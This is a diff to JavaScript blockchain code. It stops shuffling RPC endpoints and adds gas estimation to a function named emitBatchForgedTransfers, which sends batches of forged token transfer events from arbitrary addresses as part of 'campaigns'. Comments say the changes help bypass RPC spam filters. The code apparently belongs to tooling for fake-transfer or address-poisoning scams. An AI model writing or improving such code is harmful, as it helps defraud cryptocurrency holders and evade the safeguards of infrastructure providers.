@@ -695,11 +695,7 @@ const normalizedChain = chainName?.toLowerCase() || '';
 const rawUrls = [chainRpc, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
 const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));
 
-// 🚀 FIX: Shuffle the RPC URLs so we don't always burn through the same exhausted keys first
-for (let i = fallbackUrls.length - 1; i > 0; i--) {
-  const j = Math.floor(Math.random() * (i + 1));
-  [fallbackUrls[i], fallbackUrls[j]] = [fallbackUrls[j], fallbackUrls[i]];
-}
+// 🚀 FIX: DO NOT SHUFFLE. We must respect the priority list so public RPCs are used before Alchemy's private mempool.
 
 const client = createPublicClient({
   chain: viemChain,
@@ -1385,14 +1381,30 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           transport: tempTransport,
         });
 
+        // 🚀 FIX: Dynamically estimate gas for custom batch contracts to bypass RPC spam filters
+        let gasLimit = BigInt(80000 + (40000 * froms.length)); // Safe fallback
+        try {
+          const estimatedGas = await tempWalletClient.estimateContractGas({
+            address: contractAddress,
+            abi: MIRROR_TOKEN_ABI,
+            functionName: 'batchEmitTransfers',
+            args: [froms, tos, values],
+            account: walletClient.account,
+          });
+          // Add 20% buffer. Public RPCs drop batch transactions if the hardcoded limit doesn't perfectly match their simulation.
+          gasLimit = estimatedGas + (estimatedGas / 5n);
+        } catch (estErr) {
+          logger.debug(`[batch] Gas estimation failed on attempt ${attempt + 1}, using fallback.`);
+        }
+
         hash = await tempWalletClient.writeContract({
           address: contractAddress,
           abi: MIRROR_TOKEN_ABI,
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(80000 + (40000 * froms.length)),
-          maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
+          gas: gasLimit, // 🚀 Use dynamically estimated gas
+          maxFeePerGas: maxFeePerGas,
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
 
